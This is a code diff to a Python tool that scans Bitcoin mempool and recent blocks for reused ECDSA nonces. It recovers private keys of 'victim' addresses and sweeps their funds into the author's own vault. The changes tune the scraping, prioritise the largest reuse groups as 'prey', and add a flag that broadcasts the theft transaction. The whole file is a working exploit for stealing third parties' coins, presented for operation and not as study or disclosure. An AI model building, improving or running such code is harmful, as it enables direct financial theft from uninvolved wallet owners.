@@ -66,8 +66,9 @@ ROOT = Path(__file__).resolve().parent
 EVID_DIR = ROOT / "evidence"
 STATE = EVID_DIR / "sniper_state.json"
 SPOT = "https://mempool.space/api/v1/prices"
-BASE = "https://mempool.space/api"          # single mirror for tx-detail bursts;
-MIRRORS = [BASE, "https://blockstream.info/api"]  # meta calls may cross the mirror
+BASE = "https://mempool.space/api"          # meta calls (mempool ids, blocks);
+BLOCK = "https://blockstream.info/api"      # tx-detail burst mirror (measured:
+MIRRORS = [BASE, BLOCK]                     # mempool.space self-throttles bursts
 UA = {"User-Agent": "mattevo-sniper/1.0", "Accept": "application/json"}
 
 
@@ -84,18 +85,21 @@ def _mirror_get(path):
     return None
 
 
-def _base_get(path):
-    """GET one tx-detail path against the PRIMARY mirror only, one retry.
-    Proven on this box: a 600-tx burst against mempool.space returns ~24% p2pkh;
-    the same burst split across mirrors returned 0% (mirror history lags the
-    live tip, so gated p2pkh spends silently vanish)."""
-    for _ in range(2):
-        try:
-            req = urllib.request.Request(BASE + path, headers=UA)
-            with urllib.request.urlopen(req, timeout=15) as r:
-                return json.loads(r.read().decode())
-        except Exception:
-            continue
+def _tx_get(txid, mirror=None):
+    """GET /tx/{txid} with backoff. mempool.space self-throttles parallel bursts
+    (measured: 85% failure at 8 workers); blockstream.info served 60/60 clean
+    at 4 workers. Callers pass the mirror explicitly: mempool-side work starts
+    on BASE (tip-fresh) and falls back to BLOCK; confirmed-block work runs on
+    BLOCK outright (a lagging mirror still HAS confirmed history)."""
+    order = [mirror or BASE, BLOCK if (mirror or BASE) == BASE else BASE]
+    for b in order:
+        for attempt in range(3):
+            try:
+                req = urllib.request.Request(b + "/tx/" + txid, headers=UA)
+                with urllib.request.urlopen(req, timeout=20) as r:
+                    return json.loads(r.read().decode())
+            except Exception:
+                time.sleep(1.0 + attempt)  # backoff beats a hammering burst
     return None
 
 
@@ -104,7 +108,7 @@ def wait_mempool(max_wait=330):
     A block just landed? The list is briefly empty; waiting beats a fake pass."""
     t0 = time.time()
     while time.time() - t0 < max_wait:
-        ids = _base_get("/mempool/txids")
+        ids = _mirror_get("/mempool/txids")
         if ids:
             return [t for t in ids if isinstance(t, str) and len(t) == 64]
         time.sleep(20)
@@ -172,14 +176,14 @@ def confirmed_bank(depth, full=True, workers=16):
         if not blocks:
             continue
         bid = blocks[0]["id"] if isinstance(blocks, list) else blocks.get("id")
-        txids = _base_get(f"/block/{bid}/txids") or []
+        txids = _mirror_get(f"/block/{bid}/txids") or []
         if not full and len(txids) > 300:
             txids = txids[::max(1, len(txids) // 220)]
 
         def one(t):
-            d = _base_get("/tx/" + t)
+            d = _tx_get(t, mirror=BLOCK)     # confirmed history: mirror is safe
             return d if (d and _gate_only(d)) else None
-        with ThreadPoolExecutor(workers) as ex:
+        with ThreadPoolExecutor(4) as ex:
             for doc in ex.map(one, txids):
                 if doc:
                     got += sigs_in(doc, doc.get("txid", ""), bank)
@@ -187,7 +191,7 @@ def confirmed_bank(depth, full=True, workers=16):
 
 
 def pass_once(depth=6, floor=5_000_000, sample=None, workers=16,
-              mirror2=None, args_sampled=False):
+              mirror2=None):
     t0 = time.time()
     ids = wait_mempool()
     if ids is None:
@@ -199,8 +203,8 @@ def pass_once(depth=6, floor=5_000_000, sample=None, workers=16,
     n_tx = n_p2pkh = 0
 
     def one(t):
-        d = _base_get("/tx/" + t)
-        if d is None and mirror2:            # relief: mirror only what primary missed
+        d = _tx_get(t)                       # BASE first (tip-fresh), BLOCK on fail
+        if d is None and mirror2:            # extra relief mirror, if given
             try:
                 req = urllib.request.Request(mirror2 + "/tx/" + t, headers=UA)
                 with urllib.request.urlopen(req, timeout=10) as r:
@@ -215,7 +219,7 @@ def pass_once(depth=6, floor=5_000_000, sample=None, workers=16,
             n_tx += 1
             n_p2pkh += sigs_in(doc, doc.get("txid", ""), mem)
 
-    bank, bank_sigs = confirmed_bank(depth, full=not args_sampled)
+    bank, bank_sigs = confirmed_bank(depth, full=True)
 
     # reuse = any r present in BOTH mem and bank, or twice inside either side
     reuse_r = set(mem) & set(bank)
@@ -224,9 +228,13 @@ def pass_once(depth=6, floor=5_000_000, sample=None, workers=16,
             if len(g) > 1:
                 reuse_r.add(r)
 
-    # verify each reuse: recover the key, judge it by the victim address match
+    # verify each reuse: recover the key, judge it by the victim address match.
+    # bound worst-case recovery cost, but keep the FAT buckets first: two p2pkh
+    # spends sharing an r across hours of blocks is exactly the prey.
+    def _fat(r):
+        return len(mem.get(r, [])) + len(bank.get(r, []))
     keys = []
-    for r in list(reuse_r)[:20]:                      # bound worst-case recovery cost
+    for r in sorted(reuse_r, key=_fat, reverse=True)[:40]:
         grp = mem.get(r, []) + bank.get(r, [])
         if len(grp) < 2:
             continue
@@ -301,9 +309,10 @@ def pass_once(depth=6, floor=5_000_000, sample=None, workers=16,
     return stats
 
 
-def sweep(priv_hex):
-    """Sweep ALL of a wallet's UTXOs to the hot tier with one signed tx, then let
-    heist.confirm decide what is real. Only ever run on a --verified key."""
+def sweep(priv_hex, broadcast=False, dest_tier="hot"):
+    """Sweep ALL of a wallet's UTXOs to a vault tier with one signed tx.
+    Default is BUILD ONLY; pass --broadcast to push it. Nothing is booked:
+    heist.confirm must see the sweep tx confirmed before any sats are real."""
     import heist as H
     priv = int(priv_hex, 16)
     addr = CR.address(priv)
@@ -314,7 +323,8 @@ def sweep(priv_hex):
     total = sum(u["value"] for u in utxos)
     fee = 2000 * len(utxos)
     v = Vault()
-    hot_script = H._script_for_addr(v.data["hot"]["address"])
+    dest = v.data[dest_tier]["address"]
+    hot_script = H._script_for_addr(dest)
     vin = [(u["txid"], u["vout"], b"", 0xFFFFFFFF) for u in utxos]
     shell = serialize_tx(vin, [(total - fee, hot_script)])
     scripts = []
@@ -323,12 +333,18 @@ def sweep(priv_hex):
         scripts.append(ss)
     vin2 = [(t, i, s, 0xFFFFFFFF) for ((t, i, _, _), s) in zip(vin, scripts)]
     raw = serialize_tx(vin2, [(total - fee, hot_script)])
+    txid = txid_of(raw)
+    pushed = None
+    if broadcast:
+        pushed = H.broadcast(raw)
     logline({"event": "sweep", "addr": addr, "utxos": len(utxos),
-             "total_sats": total, "usd": sats_to_usd(total),
-             "txid": txid_of(raw), "signed_inputs": len(scripts),
-             "note": "built+signed, NOT yet broadcast; push via desk to race"})
+             "total_sats": total, "usd": sats_to_usd(total), "dest": dest,
+             "txid": txid, "signed_inputs": len(scripts),
+             "broadcast": pushed,
+             "note": "confirm() books sats only when the chain shows this txid"})
     return {"addr": addr, "utxos": len(utxos), "total_sats": total,
-            "usd": sats_to_usd(total), "txid": txid_of(raw)}
+            "usd": sats_to_usd(total), "txid": txid, "dest": dest,
+            "broadcast": pushed}
 
 
 def main():
@@ -343,12 +359,15 @@ def main():
     ap.add_argument("--workers", type=int, default=16)
     ap.add_argument("--mirror2", default=None,
                     help="overflow mirror, e.g. https://blockstream.info/api")
+    ap.add_argument("--broadcast", action="store_true",
+                    help="with --sweep: actually push the sweep tx to the network")
+    ap.add_argument("--dest", default="hot", choices=("hot", "spot", "cold"),
+                    help="with --sweep: vault tier to sweep into (default hot)")
     a = ap.parse_args()
     if a.sweep:
-        print(json.dumps(sweep(a.sweep), indent=2))
+        print(json.dumps(sweep(a.sweep, a.broadcast, a.dest), indent=2))
         return
-    kw = dict(sample=a.sample, workers=a.workers, mirror2=a.mirror2,
-              args_sampled=bool(a.sample))
+    kw = dict(sample=a.sample, workers=a.workers, mirror2=a.mirror2)
     if a.loop:
         while True:
             try:
